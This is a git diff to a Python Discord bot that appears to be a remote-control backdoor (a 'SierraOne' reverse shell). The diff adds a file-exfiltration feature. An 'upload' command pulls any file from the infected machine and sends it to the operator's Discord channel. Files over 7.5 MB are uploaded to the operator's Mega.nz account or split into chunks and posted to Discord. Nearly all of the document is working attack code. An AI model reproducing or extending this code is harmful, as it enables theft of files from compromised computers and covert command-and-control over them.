@@ -1,6 +1,8 @@
 import config
 import discord
 from discord.ext import commands
+import io
+from mega import Mega
 import os
 import platform
 import subprocess
@@ -36,6 +38,11 @@ async def on_ready():
     # Pin the machine info to 'sierra-hotel-'
     await send_info.pin()
 
+    if config.mega_email == "" and config.mega_password == "":
+        await channel.send("**WARNING**\nMega credentials were not found. All your uploads larger than 7.5 MB will be split into chunks and uploaded over Discord.")
+
+    else:
+        await channel.send("Mega credentials found. All your uploads larger than 7.5 MB will be uploaded to Mega.")
 
 # Create 'SierraOne' category
 async def create_category(guild):
@@ -121,9 +128,46 @@ async def shell_input(channel, message):
         # Check if the message content starts with "upload"
         if message.content.startswith("upload"):
             try:
-                # Upload the requested file
-                output = await message.channel.send(file=discord.File(message.content[7:]))
-            
+                # In reality it's 8 MB, but for the sake of having upload issues, it's been set to 7.5 MB
+                discord_limit = 7864320 
+                sierraone_limit = 33554432
+
+                name = message.content[7:].split(".")[0]
+                extension = message.content[7:].split(".")[1]
+
+                if os.path.getsize(message.content[7:]) <= discord_limit:
+                    await message.channel.send(f"Uploading `{message.content[7:]}`, standby...")
+                    await message.channel.send(file=discord.File(message.content[7:]))
+
+                elif discord_limit < os.path.getsize(message.content[7:]) <= sierraone_limit:
+                    # Check if Mega.nz credentials are present. If not, split the file into 7.5 MB chunks and upload them over Discord
+                    if config.mega_email != "" and config.mega_password != "":
+                        await message.channel.send(f"Uploading `{message.content[7:]}` to Mega, standby...")
+                        
+                        mega_file = mega_nz.upload(message.content[7:])
+                        mega_link = mega_nz.get_upload_link(mega_file)
+
+                        await message.channel.send(f"Your Mega link: {mega_link}")
+
+                    else:
+                        await message.channel.send("Splitting your file and uploading the parts, standby...")
+
+                        with open(message.content[7:], "rb") as file:
+                            chunk = file.read(7864320)
+
+                            i = 1
+                            while chunk:
+                                bytes = io.BytesIO(chunk)
+
+                                await message.channel.send(f"Uploading `{message.content[7:]}-{i}`, standby...`")
+                                await message.channel.send(file=discord.File(bytes, filename=f"{message.content[7:]}-{i}"))
+                                
+                                chunk = file.read(7864320)
+                                i += 1
+
+                else:
+                    await message.channel.send("File is too big (> 32 MB)")
+
             except FileNotFoundError:
                 # Notify the user if the requested file was not found
                 await message.channel.send("File not found")
@@ -172,5 +216,9 @@ category_prefix = config.category_prefix
 
 # Channel prefix
 channel_prefix = config.channel_prefix
+
+if config.mega_email != "" and config.mega_password != "":
+    mega = Mega()
+    mega_nz = mega.login(config.mega_email, config.mega_password)
 
 bot.run(config.bot_token)
